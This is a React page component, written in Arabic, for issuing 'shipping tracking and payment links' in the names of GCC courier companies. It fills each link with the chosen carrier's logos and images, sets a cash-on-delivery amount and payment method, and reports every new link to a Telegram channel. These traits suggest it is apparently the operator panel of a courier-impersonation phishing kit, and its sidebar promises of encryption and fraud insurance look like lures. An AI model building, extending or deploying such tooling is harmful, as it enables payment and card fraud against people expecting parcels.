import { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import {
  Package,
  MapPin,
  DollarSign,
  Hash,
  Building2,
  Copy,
  ExternalLink,
  CreditCard,
  User,
  RefreshCw,
  Truck,
  ShieldCheck,
  ArrowLeft,
  ChevronRight,
  Info
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";

const CreateShippingLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "SA");
  const services = getServicesByCountry(country?.toUpperCase() || "SA");
  
  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [payerType, setPayerType] = useState("recipient");
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdUrl, setCreatedUrl] = useState("");
  const [linkId, setLinkId] = useState("");

  const generateTrackingNumber = () => {
    const prefix = selectedService.toUpperCase().substring(0, 3) || 'TRK';
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}${timestamp}${random}`;
  };

  const serviceBranding = useMemo(() =>
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );

  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  useEffect(() => {
    if (selectedService && !trackingNumber) {
      setTrackingNumber(generateTrackingNumber());
    }
  }, [selectedService]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedService || !trackingNumber) {
      toast({ title: "خطأ", description: "الرجاء اختيار خدمة الشحن وإدخال رقم التتبع", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "SA",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: trackingNumber,
          payer_type: payerType,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/shipping/${link.id}?company=${selectedService}`;
      setCreatedUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: trackingNumber,
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData?.nameAr || 'السعودية',
          payment_url: paymentUrl
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description
      });

      toast({ title: "تم بنجاح", description: "تم إنشاء رابط تتبع الشحنة بنجاح" });
    } catch (error) {
      console.error(error);
      toast({ title: "خطأ", description: "فشل في إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!countryData) {
    return <div className="p-8 text-center"><p>الدولة غير مدعومة</p></div>;
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-[#F0F2F5] py-12 px-4" dir="rtl">
        <Card className="max-w-xl mx-auto overflow-hidden border-0 shadow-2xl rounded-3xl bg-white">
          <div className="bg-[#0052CC] p-10 text-center relative">
            <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[url('https://www.transparenttextures.com/patterns/graphy.png')]" />
            <div className="w-20 h-20 bg-white/20 rounded-full mx-auto mb-6 flex items-center justify-center border-4 border-white/30 backdrop-blur-md">
              <ShieldCheck className="w-12 h-12 text-white" />
            </div>
            <h2 className="text-3xl font-black text-white mb-2">رابط التتبع جاهز</h2>
            <p className="text-white/80">يمكنك الآن مشاركة رابط تتبع الشحنة والدفع مع العميل</p>
          </div>

          <div className="p-8 space-y-6">
            <div className="bg-[#F8F9FA] p-6 rounded-2xl border-2 border-dashed border-[#DEE2E6]">
              <p className="text-xs font-bold text-gray-400 mb-2 uppercase tracking-wider">رابط بوابة الشحن الموحدة</p>
              <div className="bg-white p-4 rounded-xl border border-gray-200 break-all text-sm font-mono shadow-inner">
                {createdUrl}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <Button
                onClick={() => {
                  navigator.clipboard.writeText(createdUrl);
                  toast({ title: "تم النسخ" });
                }}
                className="h-14 rounded-2xl bg-[#0052CC] hover:bg-[#0747A6] text-lg font-bold"
              >
                <Copy className="w-5 h-5 ml-2" /> نسخ الرابط
              </Button>
              <Button
                onClick={() => window.open(createdUrl, '_blank')}
                variant="outline"
                className="h-14 rounded-2xl border-2 border-[#0052CC] text-[#0052CC] text-lg font-bold hover:bg-[#F0F5FF]"
              >
                <ExternalLink className="w-5 h-5 ml-2" /> معاينة
              </Button>
            </div>

            <Button
              onClick={() => navigate('/services')}
              variant="ghost"
              className="w-full text-gray-500 font-bold"
            >
              العودة للخدمات
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] pb-24" dir="rtl">
      {/* Header Bar */}
      <div className="bg-white border-b sticky top-0 z-50">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <BackButton />
            <h1 className="text-xl font-black text-[#172B4D]">إصدار رابط تتبع جديد</h1>
          </div>
          <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full border border-green-100 text-xs font-bold">
            <ShieldCheck className="w-4 h-4" /> نظام آمن
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-5xl mx-auto grid lg:grid-cols-3 gap-8">
          {/* Main Form */}
          <div className="lg:col-span-2 space-y-6">
            <Card className="p-8 border-0 shadow-xl rounded-3xl bg-white">
              <form onSubmit={handleSubmit} className="space-y-8">
                {/* Service Selection */}
                <div className="space-y-4">
                  <Label className="text-lg font-black text-[#172B4D] flex items-center gap-2">
                    <Truck className="w-5 h-5 text-[#0052CC]" /> شركة الشحن والخدمة
                  </Label>
                  <Select value={selectedService} onValueChange={setSelectedService}>
                    <SelectTrigger className="h-14 border-2 rounded-2xl text-lg font-medium transition-all focus:border-[#0052CC]">
                      <SelectValue placeholder="اختر شركة الشحن المناسبة" />
                    </SelectTrigger>
                    <SelectContent className="rounded-2xl border-2">
                      {services.map((service) => (
                        <SelectItem key={service.id} value={service.key} className="h-12 text-lg">
                          {service.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>

                  {selectedService && serviceBranding && (
                    <div className="p-4 rounded-2xl bg-[#F4F5F7] border-2 border-gray-100 flex items-center gap-4 animate-in fade-in slide-in-from-top-2">
                      <div className="w-16 h-16 bg-white rounded-xl p-2 flex items-center justify-center shadow-sm">
                        <img src={serviceBranding.logo} alt="" className="max-h-full object-contain" />
                      </div>
                      <div className="flex-1">
                        <p className="text-sm font-bold text-[#172B4D]">{selectedServiceData?.name}</p>
                        <p className="text-xs text-gray-500 line-clamp-1">{serviceBranding.description}</p>
                      </div>
                    </div>
                  )}
                </div>

                <div className="grid sm:grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <Label className="text-sm font-bold text-gray-600">رقم التتبع (بوليصة الشحن)</Label>
                    <div className="relative">
                      <Input
                        value={trackingNumber}
                        onChange={(e) => setTrackingNumber(e.target.value)}
                        className="h-14 border-2 rounded-2xl text-lg font-bold pr-12"
                        placeholder="TRK-XXXXXXXX"
                      />
                      <Hash className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                      <button
                        type="button"
                        onClick={() => setTrackingNumber(generateTrackingNumber())}
                        className="absolute left-3 top-1/2 -translate-y-1/2 p-2 hover:bg-gray-100 rounded-lg text-[#0052CC] transition-colors"
                      >
                        <RefreshCw className="w-5 h-5" />
                      </button>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <Label className="text-sm font-bold text-gray-600">المسؤول عن الدفع</Label>
                    <Select value={payerType} onValueChange={setPayerType}>
                      <SelectTrigger className="h-14 border-2 rounded-2xl text-lg font-medium">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="rounded-xl">
                        <SelectItem value="recipient">المستلم (الدفع عند الاستلام)</SelectItem>
                        <SelectItem value="sender">المرسل (الدفع المسبق)</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>

                <div className="space-y-3">
                  <Label className="text-sm font-bold text-gray-600">وصف محتويات الشحنة</Label>
                  <Input
                    value={packageDescription}
                    onChange={(e) => setPackageDescription(e.target.value)}
                    className="h-14 border-2 rounded-2xl text-lg"
                    placeholder="مثال: أجهزة إلكترونية، ملابس، مستندات"
                  />
                </div>

                <div className="space-y-4 pt-4 border-t-2 border-dashed">
                  <Label className="text-lg font-black text-[#172B4D] flex items-center gap-2">
                    <DollarSign className="w-5 h-5 text-[#36B37E]" /> القيمة الإجمالية
                  </Label>
                  <div className="relative">
                    <Input
                      type="number"
                      value={codAmount}
                      onChange={(e) => setCodAmount(e.target.value)}
                      className="h-20 border-2 rounded-3xl text-4xl font-black text-center text-[#172B4D] focus:border-[#36B37E] pr-16 pl-16"
                    />
                    <div className="absolute right-6 top-1/2 -translate-y-1/2 text-xl font-bold text-gray-400">
                      {getCurrencySymbol(country || "SA")}
                    </div>
                  </div>
                  <p className="text-center text-sm text-gray-400 font-medium">سيتم تحويل المبلغ تلقائياً لعملة بلد العميل ({getCurrencyName(country || "SA")})</p>
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full h-16 rounded-2xl bg-[#0052CC] hover:bg-[#0747A6] text-xl font-black shadow-xl hover:translate-y-[-2px] transition-all active:translate-y-[1px]"
                >
                  {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : "إصدار بوليصة الشحن والرابط"}
                </Button>
              </form>
            </Card>
          </div>

          {/* Sidebar Info */}
          <div className="space-y-6">
            <Card className="p-6 border-0 shadow-lg rounded-3xl bg-white overflow-hidden relative">
              <div className="absolute top-0 right-0 w-32 h-32 bg-[#0052CC] opacity-5 -mr-16 -mt-16 rounded-full" />
              <h3 className="text-lg font-black text-[#172B4D] mb-4 flex items-center gap-2">
                <Info className="w-5 h-5 text-[#0052CC]" /> معلومات هامة
              </h3>
              <ul className="space-y-4 text-sm text-gray-600 font-medium">
                <li className="flex gap-3">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
                  رابط التتبع يعمل لمدة 7 أيام من تاريخ الإصدار.
                </li>
                <li className="flex gap-3">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
                  يتم إخطار العميل عبر الواتساب فور استلام الشحنة.
                </li>
                <li className="flex gap-3">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0052CC] mt-2 shrink-0" />
                  نظام التشفير يضمن سرية بيانات العملاء 100%.
                </li>
              </ul>
            </Card>

            <Card className="p-6 border-0 shadow-lg rounded-3xl bg-gradient-to-br from-[#36B37E] to-[#00875A] text-white">
              <div className="flex items-center justify-between mb-4">
                <ShieldCheck className="w-10 h-10 opacity-50" />
                <span className="bg-white/20 px-2 py-1 rounded text-[10px] font-black uppercase">Verified</span>
              </div>
              <h4 className="text-xl font-black mb-2">تأمين الشحنات</h4>
              <p className="text-sm opacity-90 leading-relaxed font-medium">
                جميع الروابط المصدرة عبر نظامنا مؤمنة ضد الاحتيال ومغطاة تأمينياً حتى مبلغ 10,000 ريال.
              </p>
            </Card>
          </div>
        </div>
      </div>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreateShippingLink;
